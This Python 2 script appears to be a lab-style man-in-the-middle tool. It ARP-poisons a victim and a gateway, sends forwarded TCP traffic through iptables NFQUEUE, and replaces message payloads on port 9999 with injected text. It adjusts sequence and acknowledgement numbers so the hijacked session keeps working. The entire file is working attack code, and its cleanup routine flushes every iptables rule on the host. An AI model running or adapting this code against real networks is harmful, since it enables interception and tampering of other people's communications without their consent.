#!/usr/bin/python2

import nfqueue
from scapy.all import *
import os, multiprocessing, signal, netifaces, socket, time
from multiprocessing import Process

iptablesr1 = "iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0"

global sended
global leng
global leng1
global messages
global acks
global first

class ARPSpoofingProcess(Process):
    def __init__(self, victimIP, gatewayIP, interface):
        super(ARPSpoofingProcess, self).__init__()
        self.victimIP = victimIP
        self.gatewayIP = gatewayIP
        self.interface = interface
        self.victimMAC = None
        self.gatewayMAC = None
        self.exit = multiprocessing.Event()

    def shutdown(self):
        self.exit.set()

    def run(self):
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        try:
            victimMAC = get_mac(self.victimIP, self.interface)
            if victimMAC != None:
                self.victimMAC = victimMAC
            else:
                raise Exception
            print "[+] MAC address:\t%s\tIP Address:\t%s\t" % (self.victimMAC, self.victimIP)
        except Exception:
            print "[!] Victim MAC address not found"
            sys.exit(1)
        try:
            gatewayMAC = get_mac(self.gatewayIP, self.interface)
            if gatewayMAC != None:
                self.gatewayMAC = gatewayMAC
            else:
                raise Exception
            print "[+] MAC address:\t%s\tIP Address:\t%s\t" % (self.gatewayMAC, self.gatewayIP)
        except Exception:
            print "[!] Gateway MAC Address not found"
            sys.exit(1)
        print "[*] Start ARP Poisoning attack"    
        while 1:
            try:
                if self.exit.is_set():
                    raise KeyboardInterrupt
                trick(gatewayMAC, victimMAC, self.victimIP, self.gatewayIP)
                time.sleep(1)
            except KeyboardInterrupt:
                print "[*] Stopping ARP poisoning attack.."
                reARP(self.victimIP, self.gatewayIP, self.victimMAC, self.gatewayMAC, self.interface)
                break
        
def IPForwardingON():
    print "[+] Ip forwarding enabled"
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def IPForwardingOFF():
    print "[+] Ip forwarding disabled"
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP(victimIP, gatewayIP, victimMAC, gatewayMAC, interface):
    print "[*] Restoring targets ARP table"
    victimMAC = get_mac(victimIP, interface)
    gatewayMAC = get_mac(gatewayIP, interface)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    sys.exit(1)

def trick(gm, vm, victimIP, gatewayIP):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def callback(payload):
    global sended
    global leng
    global leng1
    global messages
    global acks
    global first

    data = payload.get_data()
    pkt = IP(data)

    if (pkt["TCP"].dport == 9999 or pkt["TCP"].sport == 9999):
        if len(pkt[TCP].payload) == 0:
            print "ACK WITHOUT PAYLOAD"
            print "%s:%s\t---->\t%s:%s\n" % (
                str(pkt.src),
                str(pkt.sport),
                str(pkt.dst),
                str(pkt.dport))

            print"Seq:\t%s\tAckno.:\t%s\n\n\n" % (
                str(pkt.seq),
                str(pkt.ack))

            global sended
            if sended:
                ack = pkt.ack
                if acks.has_key("ack"):
                    print "HO GIA L'ACK"
                    pkt[TCP].ack = acks[ack]["ack"]
                    sended = False
                    first = False
                    del pkt[TCP].chksum
                    del pkt[IP].chksum
                    pkt = pkt.__class__(str(pkt[IP]))
                    print "New ACK number: %s" % (pkt.ack)
                    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                else:
                    if pkt.dst == "192.168.1.6":                    
                        if not first:
                            print "This isn't the first ack"

                        pkt.ack -= leng1
                        sended = False
                        first = False
                        del pkt[TCP].chksum
                        del pkt[IP].chksum
                        pkt = pkt.__class__(str(pkt[IP]))
                        print "New ACK number: %s" % (pkt.ack)

                        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                    else:
                        print "ACK  A ---> B"
                        pkt.seq += leng1
                        del pkt[TCP].chksum
                        del pkt[IP].chksum
                        pkt = pkt.__class__(str(pkt[IP]))
                        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

                    acks[ack] = {
                            "ack": pkt.ack,
                            "seq": pkt.seq,
                            "len": pkt.len,
                        }

            else:
                payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            seq = pkt[TCP].seq
            if messages.has_key(seq):
                
                print "There is this message yet"
                
                pkt[TCP].seq = messages[seq]["seq"]
                pkt[TCP].payload = Raw(messages[seq]["payload"])
                pkt[TCP].ack = messages[seq]["ack"]
                pkt[IP].len = messages[seq]["len"]

                print "Modified: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                    str(pkt[TCP].payload),
                    str(pkt[TCP].seq),
                    str(pkt[TCP].ack))

                del pkt[TCP].chksum
                del pkt[IP].chksum
                pkt = pkt.__class__(str(pkt[IP]))

                payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                sended = True
            else:
                if pkt.dst == "192.168.1.7":
                    print "MESSAGE"
                    print "Msg:\t%s" % (str(pkt["TCP"].payload))
                    
                    print "%s:%s\t---->\t%s:%s\n" % (
                        str(pkt.src),
                        str(pkt.sport),
                        str(pkt.dst),
                        str(pkt.dport))

                    print"Seq:\t%s\tAckno.:\t%s\n\n\n" % (
                        str(pkt.seq),
                        str(pkt.ack))         
                    
                    p = "BLABLABLA\n"

                    if not first:
                        print "Not first message"

                    pkt[TCP].seq += leng1

                    leng = len(p) - len(str(pkt[TCP].payload))
                    print "LENG = %s" % (str(leng))

                    leng1 += leng


                    pkt[TCP].payload = Raw(p)
                    pkt[IP].len = len(str(pkt[IP]))

                    print "Modified: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                        str(pkt[TCP].payload),
                        str(pkt[TCP].seq),
                        str(pkt[TCP].ack))

                    del pkt[TCP].chksum
                    del pkt[IP].chksum
                    pkt = pkt.__class__(str(pkt[IP]))

                    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
                    sended = True
                else:                   

                    print "MESSAGE FROM B: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                        str(pkt[TCP].payload),
                        str(pkt[TCP].seq),
                        str(pkt[TCP].ack))
                    pkt[TCP].ack -= leng1
                    print "NEW SEQUENCE #: Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                        str(pkt[TCP].payload),
                        str(pkt[TCP].seq),
                        str(pkt[TCP].ack))

                    messages[seq] = {
                        "seq": pkt.seq,
                        "ack": pkt.ack,
                        "len": pkt.len,
                        "payload": pkt[TCP].payload.load,
                    }
                    print "Saved(2): Msg: %s\tSeq:\t%s\tAckno.:\t%s\n" % (
                        str(messages[seq]["payload"]),
                        str(messages[seq]["seq"]),
                        str(messages[seq]["ack"]))

                    del pkt[TCP].chksum
                    del pkt[IP].chksum
                    pkt = pkt.__class__(str(pkt[IP]))
                    payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

                messages[seq] = {
                    "seq": pkt.seq,
                    "ack": pkt.ack,
                    "len": pkt.len,
                    "payload": pkt[TCP].payload.load,
                }
                print "Saved (2)"

    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)

    del pkt

def main():
    global sended
    global messages
    global acks
    global first
    global leng1

    leng1 = 0
    first = True
    messages = {}
    acks = {}
    sended = False

    interface = sys.argv[1]
    victimIP = sys.argv[2]
    gatewayIP = sys.argv[3] 

    try:
        addr = netifaces.ifaddresses(interface)
    except Exception:
        print "[!] Error! Wrong or down network interface. Exiting.."
        sys.exit(1)

    try:
        socket.inet_aton(victimIP)
    except socket.error:
        print "[!] Error! VictimIP is not a valid IPv4 address. Exiting.."
        sys.exit(1)

    try:
        socket.inet_aton(gatewayIP)
    except socket.error:
        print "[!] Error! GatewayIP is not a valid IPv4 address."
        sys.exit(1)

    IPForwardingON()

    arp_spoofing_process = ARPSpoofingProcess(victimIP, gatewayIP, interface)
    arp_spoofing_process.start()

    print("[+] Added iptables rule")
    os.system(iptablesr1)

    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        time.sleep(5)
        if not arp_spoofing_process.is_alive():
            IPForwardingOFF()
            print "[+] Removed iptables rule"
            os.system('iptables -D FORWARD -p tcp -j NFQUEUE --queue-num 0')
            os.system('iptables -F')
            os.system('iptables -X')
            sys.exit()
        print "[+] Running Main loop"
        q.try_run()
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        arp_spoofing_process.shutdown()
        arp_spoofing_process.join()
        IPForwardingOFF()
        print "[+] Removed iptables rule"
        os.system('iptables -D FORWARD -p tcp -j NFQUEUE --queue-num 0')
        os.system('iptables -F')
        os.system('iptables -X')
        """print "Messages\n"
        print messages
        print "ACKs\n"
        print acks"""

if __name__ == "__main__":
  main()
